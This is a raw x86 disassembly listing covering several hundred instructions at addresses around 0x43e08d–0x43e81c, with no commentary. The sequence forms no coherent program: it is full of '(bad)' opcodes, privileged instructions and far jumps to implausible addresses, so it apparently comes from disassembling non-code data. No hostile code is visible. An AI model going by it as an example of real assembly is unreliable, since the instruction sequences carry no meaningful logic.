  43e08d:	sub    ecx,DWORD PTR [ecx+0xc]
  43e090:	jmp    0x1bc2e012
  43e095:	or     al,BYTE PTR [edx]
  43e097:	add    BYTE PTR [edx+0x45],ah
  43e09a:	jmp    0x5974:0x3bc857c
  43e0a1:	imul   edi,DWORD PTR [esi+0x63b25a40],0x3f
  43e0a8:	bound  edi,QWORD PTR [edi+0x4b]
  43e0ab:	hlt    
  43e0ac:	in     eax,0xa6
  43e0ae:	test   DWORD PTR [ecx-0x17],ebx
  43e0b1:	aam    0x30
  43e0b3:	mov    esi,0x7882b06a
  43e0b8:	data16 fldl2t 
  43e0bb:	push   ss
  43e0bc:	ins    BYTE PTR es:[edi],dx
  43e0bd:	pop    edx
  43e0be:	push   edi
  43e0bf:	sbb    BYTE PTR [edx+0x2c],ah
  43e0c2:	test   BYTE PTR [esi-0x67a22a0b],0xad
  43e0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e0ca:	jmp    0xeb868d51
  43e0cf:	add    esp,DWORD PTR [edx-0x2a]
  43e0d2:	gs pushf 
  43e0d4:	xchg   ebp,eax
  43e0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e0d6:	jmp    0xe994bc53
  43e0db:	add    eax,DWORD PTR [eax]
  43e0dd:	bound  ecx,QWORD PTR [ecx]
  43e0df:	imul   ecx,DWORD PTR [ebx-0x641bd381],0x6f
  43e0e6:	lods   eax,DWORD PTR ds:[esi]
  43e0e7:	xchg   BYTE PTR [ebp-0x671a6312],cl
  43e0ed:	inc    eax
  43e0ee:	pop    edx
  43e0ef:	add    BYTE PTR [ecx],0xd1
  43e0f2:	iret   
  43e0f3:	or     ecx,0x8166a550
  43e0f9:	and    esi,ebx
  43e0fb:	push   edx
  43e0fc:	neg    dh
  43e0fe:	push   ebx
  43e0ff:	pop    ebp
  43e100:	add    al,0x62
  43e102:	fstp   DWORD PTR [eax+edi*8-0x64]
  43e106:	push   eax
  43e107:	fnsave [esi-0xb]
  43e10a:	ret    0x3a9
  43e10d:	nop
  43e10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e10f:	sbb    DWORD PTR [ecx-0x73952ddf],eax
  43e115:	pop    ss
  43e116:	sub    ebp,ebx
  43e118:	adc    BYTE PTR ds:0x230494d9,0x1c
  43e11f:	fisubr WORD PTR [ecx-0x1]
  43e122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e123:	jmp    0x5e1896ae
  43e128:	pop    ss
  43e129:	in     eax,dx
  43e12a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e12b:	jmp    0xe71bceb0
  43e130:	xchg   DWORD PTR [ecx-0x26],ecx
  43e133:	add    cl,ch
  43e135:	popa   
  43e136:	outs   dx,BYTE PTR ds:[esi]
  43e137:	add    ecx,ebp
  43e139:	popa   
  43e13a:	fnstcw WORD PTR [ebx]
  43e13c:	stos   BYTE PTR es:[edi],al
  43e13d:	(bad)  
  43e13e:	push   edi
  43e13f:	sub    ecx,0x0
  43e142:	popa   
  43e143:	(bad)  [ebx-0x3c119dd4]
  43e149:	push   esp
  43e14a:	stos   DWORD PTR es:[edi],eax
  43e14b:	or     ch,cl
  43e14d:	cmp    eax,0x6af7a48d
  43e152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e153:	fsubr  st,st(3)
  43e155:	es jecxz 0x43e104
  43e158:	std    
  43e159:	xor    al,0x48
  43e15b:	cmp    eax,DWORD PTR [ecx]
  43e15d:	adc    ebx,DWORD PTR [esi+0x3b]
  43e160:	add    DWORD PTR [edi],esi
  43e162:	fiadd  WORD PTR [edx+0x2c]
  43e165:	jmp    0xfa0107cb
  43e16a:	loop   0x43e18b
  43e16c:	add    eax,0x8be84cea
  43e171:	das    
  43e172:	mov    ds:0x332d4e5e,al
  43e177:	fs pop esi
  43e179:	pusha  
  43e17a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e17b:	sbb    esi,edi
  43e17d:	jb     0x43e106
  43e17f:	adc    eax,0x50a5a78c
  43e184:	dec    esp
  43e185:	loopne 0x43e16e
  43e187:	adc    eax,0xee264151
  43e18c:	add    cl,ch
  43e18e:	loop   0x43e127
  43e190:	or     BYTE PTR [edx+0x6f],ch
  43e193:	sub    eax,0xf517bc01
  43e198:	shl    BYTE PTR [eax-0x59],0x35
  43e19c:	mov    ch,BYTE PTR [edi+0x557e5c35]
  43e1a2:	mul    DWORD PTR [ebx-0x45fffe09]
  43e1a8:	mov    eax,0x20e20ef7
  43e1ad:	adc    DWORD PTR [eax],eax
  43e1af:	sti    
  43e1b0:	retf   0x5b11
  43e1b3:	cld    
  43e1b4:	pushf  
  43e1b5:	inc    ecx
  43e1b6:	sub    ah,cl
  43e1b8:	dec    edi
  43e1b9:	clc    
  43e1ba:	dec    DWORD PTR [eax]
  43e1bc:	cwde   
  43e1bd:	pop    ecx
  43e1be:	mov    edx,DWORD PTR [esi-0x34f7490f]
  43e1c4:	adc    dh,bh
  43e1c6:	dec    ebx
  43e1c8:	xlat   BYTE PTR ds:[ebx]
  43e1c9:	jne    0x43e248
  43e1cb:	(bad)  
  43e1cc:	mov    ds:0x4f128508,eax
  43e1d1:	clc    
  43e1d2:	call   DWORD PTR [eax]
  43e1d4:	pop    ss
  43e1d5:	sbb    DWORD PTR [ebp-0x75023035],eax
  43e1db:	mov    eax,0x105e59f3
  43e1e0:	jp     0x43e23c
  43e1e2:	ret    0xd773
  43e1e5:	jne    0x43e1df
  43e1e7:	mov    DWORD PTR [esi-0x28847e7e],ebx
  43e1ed:	add    BYTE PTR [ebx+0x477da945],cl
  43e1f3:	sbb    esp,DWORD PTR [edx+ecx*2]
  43e1f6:	or     bl,al
  43e1f8:	fld    DWORD PTR [edi]
  43e1fa:	add    DWORD PTR [ebp-0x57],ebx
  43e1fd:	or     BYTE PTR [esi+0x467c8e04],dh
  43e203:	aaa    
  43e204:	and    al,0x4a
  43e206:	or     bl,al
  43e208:	test   eax,0xfd0000ff
  43e20d:	mov    dl,0x8
  43e20f:	mov    dh,0xc4
  43e211:	mov    WORD PTR [esi+eax*2+0x37],?
  43e215:	and    al,0x4a
  43e217:	or     BYTE PTR [ebx-0x22ff0057],al
  43e21d:	mov    dl,0x8
  43e21f:	mov    dh,0xc4
  43e221:	mov    edi,DWORD PTR [esi+eax*2-0x9]
  43e225:	and    ecx,DWORD PTR [edx+0x8]
  43e228:	bound  edi,QWORD PTR [eax]
  43e22a:	icebp  
  43e22b:	pop    es
  43e22c:	arpl   WORD PTR [edx-0x19],si
  43e22f:	or     BYTE PTR [ebx+eax*2-0x73db7b05],ch
  43e236:	jbe    0x43e281
  43e238:	push   0x38
  43e23a:	icebp  
  43e23b:	pop    es
  43e23c:	arpl   WORD PTR [edx-0x19],dx
  43e23f:	or     BYTE PTR [esp+eiz*8],cl
  43e242:	cmc    
  43e243:	test   BYTE PTR [esp+ebp*4],ah
  43e246:	jbe    0x43e291
  43e248:	push   0x38
  43e24a:	call   0xf1364556
  43e24f:	or     ah,ch
  43e251:	ret    
  43e252:	test   BYTE PTR [esp+0x6a49768c],0x38
  43e25a:	call   0xf1164566
  43e25f:	or     ah,cl
  43e261:	jecxz  0x43e25a
  43e263:	test   BYTE PTR [esp+ebp*4],ah
  43e266:	jbe    0x43e2b1
  43e268:	push   0x38
  43e26a:	call   0xf1364576
  43e26f:	in     al,0x0
  43e271:	dec    esi
  43e272:	stos   DWORD PTR es:[edi],eax
  43e273:	push   edx
  43e274:	dec    eax
  43e275:	nop
  43e276:	daa    
  43e277:	ret    0x27e7
  43e27a:	push   edx
  43e27b:	mov    bh,al
  43e27d:	pop    ebp
  43e27e:	jmp    0x43e2ba
  43e280:	xor    BYTE PTR [edx],bh
  43e282:	hlt    
  43e283:	mov    eax,ds:0x9b083df8
  43e288:	loope  0x43e2bf
  43e28a:	or     esi,DWORD PTR [edi+0x41]
  43e28d:	dec    edx
  43e28e:	cmp    eax,0xe35f79c4
  43e293:	stos   DWORD PTR es:[edi],eax
  43e294:	xchg   BYTE PTR [eax+edi*4+0x725bbfce],ah
  43e29b:	out    0x54,eax
  43e29d:	lods   eax,DWORD PTR ds:[esi]
  43e29e:	and    DWORD PTR [edi-0x41],0xffffffa4
  43e2a2:	fnstenv [edx-0x60]
  43e2a5:	cwde   
  43e2a6:	xchg   edi,eax
  43e2a7:	icebp  
  43e2a8:	add    esi,DWORD PTR [edi+0x22]
  43e2ab:	cli    
  43e2ac:	add    ebx,DWORD PTR [ebx+0x5c]
  43e2af:	push   esp
  43e2b0:	mov    dl,ch
  43e2b2:	mov    eax,ds:0x1aa32aa2
  43e2b7:	ror    BYTE PTR [edx-0x2a115e26],cl
  43e2bd:	or     eax,0x28a06303
  43e2c2:	xchg   edi,eax
  43e2c3:	icebp  
  43e2c4:	add    esp,DWORD PTR [ebx+0x2060219]
  43e2ca:	sbb    edx,ebp
  43e2cc:	sub    dl,ch
  43e2ce:	mov    ds:0x2aa89c6,al
  43e2d3:	jae    0x43e274
  43e2d5:	add    BYTE PTR [eax],bh
  43e2d7:	xchg   edi,eax
  43e2d8:	icebp  
  43e2d9:	add    esp,DWORD PTR [esi+0x797d1494]
  43e2df:	pop    es
  43e2e0:	arpl   WORD PTR [edi],di
  43e2e2:	inc    edx
  43e2e3:	out    0xb0,al
  43e2e5:	shl    DWORD PTR [eax],0xa5
  43e2e8:	call   0xd31d44f0
  43e2ed:	ret    0x5d5a
  43e2f0:	fadd   QWORD PTR ds:0xfbc1d962
  43e2f6:	push   0x56
  43e2f8:	je     0x43e2fd
  43e2fa:	(bad)  
  43e2fb:	fldcw  WORD PTR [edx+0x7]
  43e2fe:	xchg   cl,ah
  43e300:	(bad)  
  43e301:	jle    0x43e339
  43e303:	fucomi st,st(1)
  43e305:	add    edx,DWORD PTR [ebx+0x6efbd454]
  43e30b:	mov    ds:0x18e6f8d5,al
  43e310:	or     bh,BYTE PTR [ebx-0x66]
  43e313:	rol    DWORD PTR [edx],0xc3
  43e316:	xchg   ecx,eax
  43e317:	(bad)  
  43e318:	add    BYTE PTR [ecx],bh
  43e31a:	ds es add ebp,esp
  43e31e:	cdq    
  43e31f:	mov    ds:0x1db2ef7,al
  43e324:	mov    WORD PTR [eax*2-0x2116dfa1],cs
  43e32b:	and    eax,DWORD PTR ds:0xbfda5d16
  43e331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e332:	in     eax,dx
  43e333:	fiadd  DWORD PTR [eax]
  43e335:	jmp    0x9ccff19b
  43e33a:	add    ch,al
  43e33c:	in     eax,0xd9
  43e33e:	je     0x43e3a2
  43e340:	pop    eax
  43e341:	inc    ebp
  43e342:	in     eax,dx
  43e343:	repnz test ebx,ebp
  43e346:	mul    dh
  43e348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e349:	pop    es
  43e34a:	pop    edi
  43e34b:	lods   eax,DWORD PTR ds:[esi]
  43e34c:	cdq    
  43e34d:	cmp    eax,0xd967d5
  43e352:	jmp    0x70549935
  43e357:	inc    esp
  43e358:	lds    ecx,FWORD PTR [ebx-0x7be879d4]
  43e35e:	mov    al,0x89
  43e360:	sar    DWORD PTR [edi+0x61],1
  43e363:	pusha  
  43e364:	fld    DWORD PTR [eax]
  43e366:	push   0x64
  43e368:	leave  
  43e369:	or     dh,ch
  43e36b:	hlt    
  43e36c:	and    DWORD PTR [edx],eax
  43e36e:	jmp    0x919737d4
  43e373:	fisub  WORD PTR [esi+0x2de2f5ff]
  43e379:	add    ch,cl
  43e37b:	popa   
  43e37c:	push   0xd961e909
  43e381:	cmp    DWORD PTR [edx+ecx*2],ebx
  43e384:	sar    DWORD PTR [edi-0x33],1
  43e387:	pusha  
  43e388:	fld    DWORD PTR [eax]
  43e38a:	push   0x5c
  43e38c:	mov    ebp,0x5e2e5fc
  43e391:	add    ch,cl
  43e393:	popa   
  43e394:	push   ds
  43e395:	cld    
  43e396:	add    BYTE PTR [ebx],dl
  43e398:	iret   
  43e399:	add    ecx,DWORD PTR [ecx-0x2683503a]
  43e39f:	add    BYTE PTR [eax+0x235628e1],al
  43e3a5:	pusha  
  43e3a6:	adc    DWORD PTR [eax],eax
  43e3a8:	or     edi,DWORD PTR [esi+0x6c5450f7]
  43e3ae:	jl     0x43e3a0
  43e3b0:	js     0x43e412
  43e3b2:	or     eax,DWORD PTR [ebp+0x2783a14d]
  43e3b8:	retf   0xdb
  43e3bb:	mov    eax,DWORD PTR [esi]
  43e3bd:	mov    al,0x7c
  43e3bf:	push   ebp
  43e3c0:	xlat   BYTE PTR ds:[ebx]
  43e3c1:	and    DWORD PTR [ecx+0x1c],esi
  43e3c4:	inc    edx
  43e3c5:	repnz xor BYTE PTR [ebx+0xdbca],bh
  43e3cc:	clc    
  43e3cd:	jnp    0x43e44b
  43e3cf:	dec    ebp
  43e3d0:	mov    bl,0x5a
  43e3d2:	mov    dh,0x7
  43e3d4:	inc    edx
  43e3d5:	out    0x50,eax
  43e3d7:	lea    ecx,[eax+0x58]
  43e3da:	jle    0x43e422
  43e3dc:	(bad)  
  43e3dd:	adc    esi,edi
  43e3df:	(bad)  
  43e3e0:	jnp    0x43e3bd
  43e3e2:	(bad)
  43e3e5:	out    dx,eax
  43e3e6:	sbb    BYTE PTR [ebx+0x3e7fdaca],al
  43e3ec:	repnz fiadd WORD PTR [eax+ecx*2+0x2]
  43e3f1:	fisttp WORD PTR [eax+edi*4+0x20]
  43e3f5:	add    ebx,DWORD PTR [esi-0x398b2356]
  43e3fb:	jmp    0xdb3b:0x14dffc
  43e402:	add    BYTE PTR [ecx+0x7e815500],cl
  43e408:	push   esi
  43e409:	and    esp,DWORD PTR [ecx+ecx*2]
  43e40c:	sub    BYTE PTR [eax+0x626a20ee],dh
  43e412:	mov    dl,0x32
  43e414:	dec    edi
  43e415:	and    eax,0x5a4175e3
  43e41a:	sub    esi,DWORD PTR [edi]
  43e41c:	sub    al,0xe9
  43e41e:	outs   dx,DWORD PTR ds:[esi]
  43e41f:	fild   DWORD PTR [ebp+esi*4-0x6a01e530]
  43e426:	inc    ecx
  43e427:	jle    0x43e3f6
  43e429:	jmp    0x43e499
  43e42b:	inc    ebx
  43e42c:	test   DWORD PTR [esp+ebp*2+0x3b3a487a],ebx
  43e433:	sub    BYTE PTR [eax],ah
  43e435:	js     0x43e3e9
  43e437:	xor    ecx,DWORD PTR [edi-0x23]
  43e43a:	ret    0x4a7b
  43e43d:	jp     0x43e468
  43e43f:	aaa    
  43e440:	inc    esp
  43e441:	loope  0x43e434
  43e443:	div    BYTE PTR [edi+0x3b063]
  43e449:	xchg   ecx,eax
  43e44a:	nop
  43e44b:	sbb    DWORD PTR [ebx*4+0x6211c436],eax
  43e452:	mov    al,0x3
  43e454:	add    BYTE PTR [edx-0x50],ah
  43e457:	je     0x43e3da
  43e459:	(bad)  
  43e45a:	jle    0x43e45f
  43e45c:	add    cl,ch
  43e45e:	out    dx,eax
  43e45f:	fmul   QWORD PTR [edi-0x27]
  43e462:	out    dx,eax
  43e463:	aam    0x4f
  43e465:	test   DWORD PTR [ecx+0x7a],eax
  43e468:	mov    DWORD PTR [eax],eax
  43e46a:	ficomp WORD PTR [esi+0x74e10003]
  43e470:	sar    DWORD PTR [esp+ebp*8-0x79],cl
  43e474:	add    ecx,DWORD PTR [ebx+0x3fd4e]
  43e47a:	bound  esi,QWORD PTR [eax+0x296a4174]
  43e480:	es or  al,0xd6
  43e483:	cmc    
  43e484:	cmp    DWORD PTR [ecx-0x5e],0xffffffb0
  43e488:	pop    es
  43e489:	inc    ecx
  43e48a:	loope  0x43e464
  43e48c:	fistp  QWORD PTR [edi]
  43e48e:	bound  esp,QWORD PTR ds:0x24ed80a9
  43e494:	or     eax,0x4388147b
  43e499:	js     0x43e50c
  43e49b:	or     DWORD PTR [ebp-0x1],ebp
  43e49e:	popf   
  43e49f:	fisubr DWORD PTR [eax]
  43e4a1:	jp     0x43e43b
  43e4a3:	int    0x60
  43e4a5:	ins    DWORD PTR es:[edi],dx
  43e4a6:	rol    esi,0xe9
  43e4a9:	add    esp,edi
  43e4ab:	add    edi,esi
  43e4ad:	fst    QWORD PTR cs:[esi-0x7f]
  43e4b1:	in     eax,dx
  43e4b2:	in     eax,dx
  43e4b3:	popf   
  43e4b4:	pusha  
  43e4b5:	jne    0x43e498
  43e4b7:	fsubr  st,st(1)
  43e4b9:	add    esp,ebp
  43e4bb:	inc    esi
  43e4bc:	jno    0x43e4c1
  43e4be:	(bad)  
  43e4bf:	fstp   DWORD PTR [edi]
  43e4c1:	cmp    eax,0x7a01d186
  43e4c6:	rcr    BYTE PTR [ebp-0x1e8db1a],1
  43e4cc:	jb     0x43e46d
  43e4ce:	add    BYTE PTR [eax],bl
  43e4d0:	fwait
  43e4d1:	or     DWORD PTR [ebx+eiz*4],eax
  43e4d4:	push   ss
  43e4d5:	out    0x69,al
  43e4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e4d8:	popf   
  43e4d9:	jmp    0xe259880a
  43e4de:	add    edx,eax
  43e4e0:	sbb    dl,ch
  43e4e2:	fwait
  43e4e3:	jnp    0x43e499
  43e4e5:	scas   al,BYTE PTR es:[edi]
  43e4e6:	test   DWORD PTR [ebx],ebp
  43e4e8:	add    dh,BYTE PTR [edx-0x78]
  43e4eb:	jp     0x43e48a
  43e4ed:	sahf   
  43e4ee:	and    eax,0xc234b3df
  43e4f3:	dec    ebp
  43e4f4:	fnstenv [edx]
  43e4f6:	dec    esp
  43e4f7:	imul   ebx,DWORD PTR [ebp+0x50ba8586],0xffffff84
  43e4fe:	daa    
  43e4ff:	adc    al,0xfa
  43e501:	jmp    0xe13c51
  43e506:	jbe    0x43e4e7
  43e508:	push   ebp
  43e509:	fisttp QWORD PTR [eax+eiz*1]
  43e50c:	mov    ebp,0x90fa3500
  43e511:	les    ebp,FWORD PTR ds:0xbcc490ea
  43e517:	stos   BYTE PTR es:[edi],al
  43e518:	mov    al,0x8b
  43e51a:	pushf  
  43e51b:	sbb    DWORD PTR [ebx],ecx
  43e51d:	xor    al,0x3f
  43e51f:	sub    edx,DWORD PTR [ebx-0x24753494]
  43e525:	adc    al,0xf2
  43e527:	(bad)  
  43e528:	sub    BYTE PTR [eax+eiz*2+0x56],bl
  43e52c:	mov    ebp,0x54059889
  43e531:	jno    0x43e524
  43e533:	add    BYTE PTR [eax+0x2b],ch
  43e536:	sbb    DWORD PTR [edx+0x2e],esp
  43e539:	sar    DWORD PTR [ebx],1
  43e53b:	aaa    
  43e53c:	jb     0x43e515
  43e53e:	or     DWORD PTR [ebx],0x61
  43e541:	push   esp
  43e542:	push   ecx
  43e543:	mov    ecx,0xec305454
  43e548:	popa   
  43e549:	(bad)  [ecx-0x2d3c747]
  43e54f:	outs   dx,DWORD PTR ds:[esi]
  43e550:	push   ecx
  43e551:	int    0x89
  43e553:	pop    ecx
  43e554:	(bad)  
  43e555:	push   ebx
  43e556:	jo     0x43e569
  43e558:	sub    DWORD PTR [esi*1+0xc521a6],ebp
  43e55f:	imul   esp,DWORD PTR [ecx-0x27],0x546a3189
  43e566:	dec    eax
  43e567:	sbb    DWORD PTR [ecx],ecx
  43e569:	adc    al,0x45
  43e56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e56c:	loope  0x43e5ca
  43e56e:	sbb    ebp,ecx
  43e570:	popa   
  43e571:	pushf  
  43e572:	imul   ecx
  43e574:	popa   
  43e575:	call   0x8ef7:0x9c7aad80
  43e57c:	out    0xa0,al
  43e57e:	test   DWORD PTR [eax],0x5d599818
  43e584:	stc    
  43e585:	fwait
  43e586:	div    DWORD PTR [edi-0x7aa33]
  43e58c:	ins    DWORD PTR es:[edi],dx
  43e58d:	hlt    
  43e58e:	mov    dh,0x4
  43e590:	dec    ebx
  43e591:	fs retf 
  43e593:	int3   
  43e594:	jg     0x43e5fa
  43e596:	retf   
  43e597:	int3   
  43e598:	add    dh,ah
  43e59a:	and    ah,ch
  43e59c:	mov    edi,esi
  43e59e:	lahf   
  43e59f:	and    al,0xd2
  43e5a1:	pusha  
  43e5a2:	pop    edi
  43e5a3:	jae    0x43e5bf
  43e5a5:	nop
  43e5a6:	pop    ss
  43e5a7:	adc    eax,0x5cc393b
  43e5ac:	push   ecx
  43e5ad:	sub    al,0x28
  43e5b0:	mov    DWORD PTR [ebx+0xb507e83],edi
  43e5b6:	inc    eax
  43e5b7:	pop    ecx
  43e5b8:	dec    DWORD PTR [ebp+edx*2+0x5a]
  43e5bc:	ret    0xd7c7
  43e5bf:	mov    eax,0xf8555cfe
  43e5c4:	pop    ebp
  43e5c5:	jns    0x43e563
  43e5c7:	test   ebx,0x8bec20e6
  43e5cd:	ficomp WORD PTR [edi-0x5f0d7ab0]
  43e5d3:	jae    0x43e560
  43e5d5:	inc    edx
  43e5d6:	stc    
  43e5d7:	cmp    edi,0x7
  43e5da:	stos   BYTE PTR es:[edi],al
  43e5db:	inc    esp
  43e5dc:	push   esi
  43e5dd:	add    BYTE PTR [edx-0x622a7af5],ah
  43e5e3:	add    DWORD PTR [ebx],esi
  43e5e5:	rcr    BYTE PTR [edi],0xda
  43e5e8:	jmp    0x43e667
  43e5ea:	dec    edx
  43e5eb:	fld    st(1)
  43e5ed:	mov    al,0xd0
  43e5ef:	xor    eax,0x7be4bd83
  43e5f4:	add    edi,eax
  43e5f6:	or     DWORD PTR cs:[ebp+0x11f83c62],eax
  43e5fd:	add    cl,ah
  43e5ff:	dec    edx
  43e600:	add    al,0x7c
  43e602:	pop    edi
  43e603:	das    
  43e604:	or     DWORD PTR [eax],0xffffffcc
  43e607:	lods   al,BYTE PTR ds:[esi]
  43e608:	loope  0x43e65e
  43e60a:	or     ah,BYTE PTR [ebx]
  43e60c:	test   al,bh
  43e60e:	cmp    eax,0x6abde1cc
  43e613:	mov    al,0x86
  43e615:	inc    eax
  43e616:	jbe    0x43e64d
  43e618:	cmp    eax,0xfbc94673
  43e61d:	and    edx,DWORD PTR [esi-0x5c7b2c5d]
  43e623:	enter  0x4687,0x46
  43e627:	inc    eax
  43e628:	or     dh,0xd9
  43e62b:	jne    0x43e638
  43e62d:	jge    0x43e655
  43e62f:	mov    ecx,0xb02e404a
  43e634:	add    eax,DWORD PTR [eax]
  43e636:	bound  esp,QWORD PTR [ecx-0x7c]
  43e639:	pop    eax
  43e63a:	pop    edx
  43e63b:	cmp    esp,edi
  43e63d:	and    ecx,edx
  43e63f:	push   0x72d5f882
  43e644:	(bad)  
  43e645:	pop    eax
  43e646:	das    
  43e647:	out    dx,al
  43e648:	add    al,0x0
  43e64a:	or     ah,BYTE PTR [ebx+0x4bbdf882]
  43e650:	loopne 0x43e60f
  43e652:	push   0xffffffb0
  43e654:	inc    edi
  43e655:	retf   
  43e656:	sahf   
  43e657:	ins    BYTE PTR es:[edi],dx
  43e658:	inc    edi
  43e659:	retf   
  43e65a:	xchg   esi,eax
  43e65b:	fld    QWORD PTR [edi+0xcf5e9eb]
  43e661:	dec    ebp
  43e662:	add    BYTE PTR [ecx+0x77],dl
  43e665:	ss mov ebp,0xff7e345d
  43e66b:	test   DWORD PTR [eax-0x1608e7c5],esi
  43e671:	jg     0x43e6ed
  43e673:	dec    esi
  43e674:	fabs   
  43e676:	clc    
  43e677:	cmc    
  43e678:	add    dh,BYTE PTR [ebx-0x8]
  43e67b:	pop    ebp
  43e67c:	ficomp WORD PTR [edx+0x1f4e6af7]
  43e682:	and    al,0xdd
  43e684:	cli    
  43e685:	loope  0x43e6c5
  43e687:	(bad)  
  43e689:	fnstsw WORD PTR [eax+ebp*4]
  43e68c:	cmc    
  43e68d:	hlt    
  43e68e:	push   cs
  43e68f:	cwde   
  43e690:	popa   
  43e691:	cmp    BYTE PTR [bp+si],0x9a
  43e695:	ret    0xefe0
  43e698:	enter  0x8ee9,0x9b
  43e69c:	icebp  
  43e69d:	mov    dh,0xeb
  43e69f:	sub    DWORD PTR [esi-0x2783fc17],edi
  43e6a5:	cwde   
  43e6a6:	sbb    BYTE PTR ds:0x2186414e,0xcd
  43e6ad:	bnd jle 0x43e720
  43e6b0:	int    0x86
  43e6b2:	loope  0x43e661
  43e6b4:	pushf  
  43e6b5:	push   ds
  43e6b6:	sub    dl,0xfd
  43e6b9:	mov    ah,0x45
  43e6bb:	push   ebp
  43e6bc:	fldenv [edx-0x28]
  43e6bf:	imul   eax,DWORD PTR [edi],0x3760161
  43e6c5:	jno    0x43e6a9
  43e6c7:	add    BYTE PTR [ecx-0x357d164f],dl
  43e6cd:	cdq    
  43e6ce:	bound  ebx,QWORD PTR [ebx-0x20]
  43e6d1:	jge    0x43e740
  43e6d3:	pop    ss
  43e6d4:	fist   WORD PTR [edx]
  43e6d6:	adc    cl,BYTE PTR [ebp-0x2bd10ae5]
  43e6dc:	stos   BYTE PTR es:[edi],al
  43e6dd:	xchg   DWORD PTR [edx+0x48],ebp
  43e6e0:	gs xchg edx,eax
  43e6e2:	pop    ds
  43e6e3:	and    BYTE PTR [edx-0x27],ah
  43e6e6:	jmp    0x733f11ee
  43e6eb:	inc    ebp
  43e6ec:	cs cld 
  43e6ee:	add    BYTE PTR [ebx-0x4c4726aa],ch
  43e6f4:	jecxz  0x43e696
  43e6f6:	test   DWORD PTR [edx-0x73],0x15e9105b
  43e6fd:	mov    es,esp
  43e6ff:	scas   al,BYTE PTR es:[edi]
  43e700:	es and eax,0x9921f331
  43e706:	mov    esi,0xe02a29
  43e70b:	jmp    0x19848171
  43e710:	jbe    0x43e709
  43e712:	inc    eax
  43e713:	jmp    0xec9cbfc2
  43e718:	popa   
  43e719:	fld    DWORD PTR [eax]
  43e71b:	sub    dl,BYTE PTR [edx-0x11433b5c]
  43e721:	test   BYTE PTR [ecx-0x49],dl
  43e724:	out    0x5,al
  43e726:	adc    eax,0xcd606a
  43e72b:	xchg   esi,eax
  43e72c:	add    dh,dl
  43e72e:	nop
  43e72f:	ins    DWORD PTR es:[edi],dx
  43e730:	add    ch,bh
  43e732:	and    bl,BYTE PTR ds:0xb8f90f62
  43e738:	call   0x3a44c09e
  43e73d:	jle    0x43e79c
  43e73f:	dec    ebx
  43e740:	ror    edi,0x97
  43e743:	inc    edi
  43e744:	mov    eax,0x2d83a6e2
  43e749:	jb     0x43e7ab
  43e74b:	ds mov ch,0xdc
  43e74e:	pop    eax
  43e74f:	ins    DWORD PTR es:[edi],dx
  43e750:	loop   0x43e714
  43e752:	push   eax
  43e753:	add    ecx,ebp
  43e755:	popa   
  43e756:	fst    DWORD PTR [esi+0x72]
  43e759:	inc    esp
  43e75a:	xor    eax,esp
  43e75c:	sbb    bl,BYTE PTR [esi]
  43e75e:	iret   
  43e75f:	add    DWORD PTR ds:[ebp+0x4a1f8be5],edx
  43e766:	dec    edi
  43e767:	add    DWORD PTR [eax],eax
  43e769:	jnp    0x43e747
  43e76b:	add    bl,dl
  43e76d:	cdq    
  43e76e:	arpl   WORD PTR [ecx+0x30],ax
  43e771:	add    ah,BYTE PTR [edx-0x3ab276d5]
  43e777:	sbb    eax,0x41656b7b
  43e77c:	sub    BYTE PTR [eax-0x3fd799ec],al
  43e782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e783:	or     ecx,DWORD PTR [ebx+0x2b50d18d]
  43e789:	adc    ebp,DWORD PTR [ebx-0x300417bb]
  43e78f:	add    BYTE PTR [eax],al
  43e791:	add    al,al
  43e793:	mov    ds:0xe7ff831f,al
  43e798:	jg     0x43e7e0
  43e79a:	push   edi
  43e79b:	jp     0x43e75d
  43e79d:	inc    esi
  43e79e:	dec    ebx
  43e79f:	fld    QWORD PTR [eax]
  43e7a1:	add    BYTE PTR [ebx],cl
  43e7a3:	int    0xc0
  43e7a5:	pop    esi
  43e7a6:	cmp    bh,0x5a
  43e7a9:	ret    
  43e7aa:	jo     0x43e74f
  43e7ac:	daa    
  43e7ad:	mov    DWORD PTR [esi-0x4238d2e9],edi
  43e7b3:	fidivr WORD PTR [edi+0x7d]
  43e7b6:	inc    edi
  43e7b7:	ror    BYTE PTR gs:[ebx+0x567de7b0],0xf
  43e7bf:	fst    QWORD PTR [edx+0x30]
  43e7c2:	sbb    eax,ebp
  43e7c4:	leave  
  43e7c5:	push   ecx
  43e7c6:	sbb    DWORD PTR [edx+eax*4],eax
  43e7c9:	xor    al,0xbb
  43e7cb:	fstp   TBYTE PTR [ebp+0x4d]
  43e7ce:	(bad)  
  43e7cf:	pop    ebx
  43e7d0:	ret    
  43e7d1:	or     al,0xa0
  43e7d3:	adc    dh,BYTE PTR [esp+0x40]
  43e7d7:	popf   
  43e7d8:	or     ecx,DWORD PTR [ebx+0x2b51d175]
  43e7de:	cld    
  43e7df:	lods   al,BYTE PTR ds:[esi]
  43e7e0:	inc    esi
  43e7e1:	call   0x7d0648
  43e7e6:	(bad)  
  43e7e7:	sti    
  43e7e8:	into   
  43e7e9:	daa    
  43e7ea:	loope  0x43e831
  43e7ec:	adc    BYTE PTR [edi-0x79296dfc],al
  43e7f2:	adc    al,0xde
  43e7f4:	xor    eax,eax
  43e7f6:	add    BYTE PTR [ebx+edi*8],dl
  43e7f9:	imul   ebx,DWORD PTR [edx-0x5f],0x6327bf0a
  43e800:	enter  0x372c,0xa4
  43e804:	mov    al,0xf8
  43e806:	add    BYTE PTR ds:0x62002cbf,bl
  43e80c:	add    BYTE PTR [ebx],0x85
  43e80f:	lods   al,BYTE PTR ds:[esi]
  43e810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e811:	cmp    dl,al
  43e813:	mov    cl,0x85
  43e815:	add    cl,bh
  43e817:	jmp    0x43e807
  43e819:	xor    BYTE PTR [ecx+0x71],bl
  43e81c:	rcl    dh,0x84
